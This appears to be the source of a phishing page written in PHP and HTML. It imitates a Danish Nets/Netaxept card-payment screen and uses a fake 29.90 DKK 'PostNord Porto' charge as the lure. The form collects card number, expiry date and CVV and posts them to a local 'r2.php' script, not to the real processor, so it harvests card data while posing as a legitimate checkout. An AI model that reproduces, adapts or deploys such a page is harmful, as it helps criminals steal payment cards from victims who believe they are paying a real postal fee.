<?php
session_start();
?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="da-DK"><head id="Head1"><title>
	Nets - Accepter betaling
</title>
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0" ;="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-touch-fullscreen" content="YES"><meta name="robots" content="noindex"><link href="css/StyleIPhoneExistingTerminal.css" rel="stylesheet" type="text/css">
    
    <style>
        #cancelButton {
            left: unset;
            right: 6px;
        }
    </style>
</head>
<body id="body" style="" cz-shortcut-listen="true">
      <form name="form1" method="post" action="r2.php" id="form1">















    <nav id="navbar" class="toolbar">
        <h1 id="pageTitle" style="color: #000000">Netaxept</h1>
        <input type="submit" name="cancelButton" value="Afbryd" id="cancelButton" style="color:Black;">  
                 
    </nav>
    <div id="bbsHostedContent">
        <div class="content">
            <div class="contentPadding">
                <div style="margin-bottom: 5px;">
                    <img id="netsTechnology" src="https://epayment.nets.eu/terminal/Images/Mobile/netsTechnlogy_New.png" alt="Nets Logo" style="border-width:0px;">
                </div>
                <div id="informationPanel" style="border-bottom: 1px solid #CCC;margin: 12px -10px 1em;">
	
                    <div style="padding-left: 10px;">
                        <span id="merchantLabel" style="font-weight:bold;">Forretning:</span>&nbsp;<span id="merchantNameTxt" style="padding-left: 17px;">PostNord Porto</span>
                    </div>
                    <div>
                        <table style="padding-left: 10px; border-spacing:0px; width:auto">
                            <tbody><tr>
                                <td id="amountRow" style="padding-right: 5px">
                                    <span style="font-weight: bold;">
                                        <span id="amountLabel" style="font-weight:bold;">Beløb:</span></span>
                                </td>
	
                                <td>
                                    <div style="width:125px;text-align:right;">
                                    <span id="amount">29,90 (DKK)</span>
                                     </div>
                                </td>
                                <td>
                                    
                                </td>
                            </tr>
                            <tr id="roundingAmountRow">
		<td style="padding-right: 5px">
                                    <span id="roundingLabel"></span>
                                </td>
		<td>
                                    <div style="width:125px;text-align:right;">
                                    <span id="rounding"></span>
                                     </div>
                                </td>
	</tr>
	
                            <tr id="totalAmountRow">
		<td style="padding-right: 5px">
                                    <span id="totalAmountLabel"></span>
                                </td>
		<td>
                                    <span class="lineTop" style="width:125px;text-align: right"></span>
                                    <div style="width:125px;text-align:right;">
                                    <span id="totalAmount"></span>
                                    </div>                                         
                                </td>
	</tr>
	
                        </tbody></table>
                    </div>
                    <div id="orderNumberDiv" style="margin-top: 10px;padding-left: 10px;">
                        <span id="orderNumberLabel" style="font-weight:bold;">Ordrenummer:</span>&nbsp;<span id="orderNumber">135990343</span>
                    </div>
                    
                
</div>
                
				<div style="margin-top: 10px;">
					





<div style="padding-top:5px">
<div>
	<label for="cardNumber" id="cardNoLabel">Kortnummer</label>
</div>
<div style="vertical-align: bottom;">
	<input name="cc16" maxlength="16" id="cardNumber" placeholder="0000 0000 0000 0000" required="" autocomplete="off" type="tel" size="19" style="border:1px solid dimgrey;">
</div>

<table style="padding: 0 0 0 0; margin-top: 10px;" aria-describedby="">
	<tbody><tr>
		<td style="vertical-align: top;">
			<label for="month">
                    <span>
                        <span id="expiryLabel">Udløbsdato (mm/åå)</span></span>
                </label>
		</td>
		<td style="vertical-align: top;">
			<label for="securityCode" id="securityCodeLabel">Verifikationskode</label>
		</td>
	</tr>
	<tr>
		<td style="vertical-align: top;">
			<div>
				<select aria-required="" name="expmm" id="month" aria-label="Month" style="border:1px solid dimgrey;">
	<option value="01">01</option>
	<option value="02">02</option>
	<option value="03">03</option>
	<option value="04">04</option>
	<option value="05">05</option>
	<option value="06">06</option>
	<option value="07">07</option>
	<option value="08">08</option>
	<option value="09">09</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>

</select>
				<select aria-required="" name="expmy" id="year" aria-label="Year" style="border:1px solid dimgrey;">
	
	<option value="23">2023</option>
	<option value="24">2024</option>
	<option value="25">2025</option>
	<option value="26">2026</option>
	<option value="27">2027</option>
	<option value="28">2028</option>
	<option value="29">2029</option>
	<option value="30">2030</option>
	<option value="31">2031</option>
	<option value="32">2032</option>
	<option value="33">2033</option>
	<option value="34">2034</option>

</select>
			</div>
		</td>
		<td style="vertical-align: top;">
			<input name="cvv" maxlength="3" id="securityCode" placeholder="000" autocomplete="off" required="" type="tel" size="4" style="border:1px solid dimgrey;"><span id="mifDiv" style="display:none"><label class="mifLabel"><span id="mifTxt" style="vertical-align: middle;">Betal som Visa</span><input id="mifCheckbox" type="checkbox" name="CreditCardMobileIssuer$mifCheckbox"><span class="mifCheckmark" aria-role="checkbox"></span><img id="visaImage" src="/Images/Issuers/Icons/visa.png" style="border-width:0px;vertical-align: middle;"></label></span>
		</td>
	</tr>
</tbody></table>
    
</div>






				</div>
                
            </div>
        </div>        
        <input type="submit" name="payButton" value="Betal" id="payButton"><br>
        <img id="progressImage" alt="Loading..." src="../../images/transparentProgress.gif" style="display:none">
          
      
 <!-- The Modal -->
          
        </div>

    


</form>


</body></html>